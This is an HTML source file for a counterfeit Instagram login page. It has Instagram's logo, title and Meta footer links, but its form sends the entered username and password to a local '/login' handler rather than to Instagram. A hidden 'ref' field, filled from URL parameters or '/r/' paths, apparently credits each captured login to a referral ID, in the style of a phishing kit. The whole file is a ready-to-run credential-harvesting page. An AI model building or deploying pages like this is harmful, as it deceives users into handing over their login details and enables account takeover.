<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="./public/icons/InstagramIcon.png" type="image/png">
    <title>Instagram.com</title>
    <link rel="stylesheet" href="./public/styles/style.css">
</head>
<body>
    <div class="user-credential-div">
        <div class="box">
            <img class="instagram-logo" src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png"></img>
            <form action="/login" method="POST">
                <!-- Hidden referral field -->
                <input type="hidden" id="ref" name="ref" value="">
                
                <div>
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or Email" class="user-email-place" required><br><br>
                </div>
                <div>
                    <input type="password" id="password" name="password" placeholder="Password" class="user-password-place" required><br><br>
                </div>
                <div>
                    <button type="submit" class="login-button">
                        <span>Log&nbsp;In</span>
                    </button>
                </div>
                <div class="or-section">
                    <div class="or-divider"></div>
                    <div class="or-text">OR</div>
                    <div class="or-divider"></div>
                </div>
                <a target="_blank" href="https://www.facebook.com/">
                    <div class="facebook-section">
                        <img width="26" height="26" src="https://img.icons8.com/color/48/facebook.png" alt="facebook"/>
                        <p class="facebook-login-text">Log in with Facebook</p>
                    </div>
                </a>
                <a href="https://www.instagram.com/accounts/password/reset/">
                    <h5>
                        <p class="forgot-password-text">Forgot password?</p>
                    </h5>
                </a>
            </form>
        </div>
    </div>
    <div class="sign-up-div">
        <p class="sign-up-text">Don't have an account? <span><a class="bl-text" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></span></p>
    </div>
    <div class="get-app">
        <p class="get-app-text">Get the app.</p>
        <div class="app">
            <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android">
                <img class="app-google" src="./public/icons/google.png">
            </a>
            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt">
                <img class="app-microsoft" src="./public/icons/microsoft.png">
            </a>
        </div>
        <footer>
            <h5>
                <div class="footer">
                    <p class="first-line">
                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/"><span>Meta</span></a>
                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/"><span>About</span></a>
                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/en_US/blog"><span>Blog</span></a>
                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/about-us/careers"><span>Jobs</span></a>
                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/"><span>Help</span></a>
                        <a target="_blank" class="f-line-elements" href="https://developers.facebook.com/docs/instagram"><span>API</span></a>
                        <a target="_blank" class="f-line-elements" href="https://privacycenter.instagram.com/"><span>Privacy</span></a>
                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/581066165581870/"><span>Terms</span></a>
                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/directory/profiles/"><span>Top Accounts</span></a>
                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/explore/locations/"><span>Locations</span></a>
                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/web/lite/"><span>Instagram Lite</span></a>
                        <a target="_blank" class="f-line-elements" href="https://www.threads.net/"><span>Threads</span></a>
                        <a target="_blank" class="f-line-elements" href="https://www.facebook.com/help/instagram/261704639352628"><span>Contact Uploading & Non-Users</span></a>
                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/technologies/meta-verified/"><span>Meta Verified</span></a>
                    </p>
                    <p class="second-line">
                        <span class="s-line-elements">English <img width="12" height="12" src="https://img.icons8.com/ios-glyphs/30/expand-arrow--v1.png" alt="expand-arrow--v1" /></span>
                        <span class="s-line-elements">Â© 2023 Instagram from Meta</span>
                    </p>
                </div>
            </h5>
        </footer>
    </div>

    <script>
        // Auto-fill referral ID from URL parameters or path
        document.addEventListener('DOMContentLoaded', function() {
            // Check URL parameters first
            const urlParams = new URLSearchParams(window.location.search);
            const refParam = urlParams.get('ref');
            
            // Then check path (for /r/123 links)
            const pathMatch = window.location.pathname.match(/\/r\/(\d+)/);
            const pathRef = pathMatch ? pathMatch[1] : null;
            
            // Use whichever ref is available
            const ref = refParam || pathRef;
            
            if (ref) {
                document.getElementById('ref').value = ref;
                console.log('Referral ID set:', ref);
            }
        });
    </script>
</body>
</html>